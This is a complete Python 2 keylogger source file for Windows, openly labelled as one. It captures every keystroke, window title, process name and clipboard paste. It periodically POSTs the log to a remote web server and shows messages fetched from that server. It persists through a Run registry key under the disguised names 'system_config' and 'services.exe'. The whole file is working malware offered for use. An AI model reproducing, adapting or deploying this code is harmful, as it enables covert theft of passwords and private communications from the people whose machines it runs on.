# -*- coding: utf-8 -*- 
#  A sample keyloger.
#  Using http "POST" method sending log data to the Web Server.
#  So that you can get the log with any browser and any where.
#  And add an function to send message to the client.
#  Using PyInstaller converts Python into executable Windows programs.
#
#  Author:linger
#  Mail:lingerhk@gmail.com

import os
import sys
import time
import thread
import urllib
import requests
import win32api
import win32con
import pythoncom
import pyHook
import win32clipboard
from ctypes import *

 
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

old = ' '
client_id = 'yang-PC'
filename = 'log.txt'
POST_URL = 'http://xxxx.sinaapp.com/action.php'
MSG_URL = 'http://xxxx.sinaapp.com/msgbox.txt'
tittle = u'消息啦'

def showmsg(text):
	global old
	if ((cmp(old,text) !=0) and (cmp(res[:t],client_id)==0)):
		win32api.MessageBox(0,text,tittle,0)
		old = text
	else:
		pass	

def get_msg(res):
	global t
	t = 0
	for i in res:
		if i == '@':
			break
		t += 1
	return(res[t+1:])

def write_txt(log):
	f = open(filename,'a+')
	f.write(log)
	f.close()

def send_Information():
	while True:
		time.sleep(10)
		try:
			f = open(filename,'r')
			lines = f.readlines()
			f.close()
			info = ''.join(lines)
			if (len(info)> 3):
				data = {'msg':info}
				requests.post(POST_URL,data)
				f = open(filename,'w')
				f.close()
				try:
					res = urllib.urlopen(MSG_URL).read()
					print 'get msgbox ok！'
					text = get_msg(res)
					showmsg(text)
				except:
					pass
		except:
			time.sleep(200)
			pass

def get_current_process():
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))
    process_id = "%d" % pid.value
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
    windows_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd,byref(windows_title),512)
    write_txt('\n['+client_id+']-'+executable.value+'-'+windows_title.value+'\n==>')
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def KeyStroke(event):
    global current_window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
    if event.Ascii > 32 and event.Ascii <127:
        write_txt(chr(event.Ascii))
    else:
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            write_txt('[PASTE]-'+pasted_value)
        else:
            write_txt('['+event.Key+']')
    return True 
 
def keyloger():
	kl = pyHook.HookManager()
	kl.KeyDown = KeyStroke
	kl.HookKeyboard()
	pythoncom.PumpMessages()

def getPath():
    path=os.getcwd()+'services.exe'
    return path
	
def add_start(path):
	try: #using the 'KEY_ALL_ACCESS',so please running with administrator
		subkey='SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
		key=win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE,subkey,0,win32con.KEY_ALL_ACCESS)
		win32api.RegSetValueEx(key,'system_config',0,win32con.REG_SZ,path)
	except:
		pass
	
if __name__=='__main__':		
	add_start(getPath())
	thread.start_new_thread(send_Information,())
	time.sleep(1)
	keyloger()
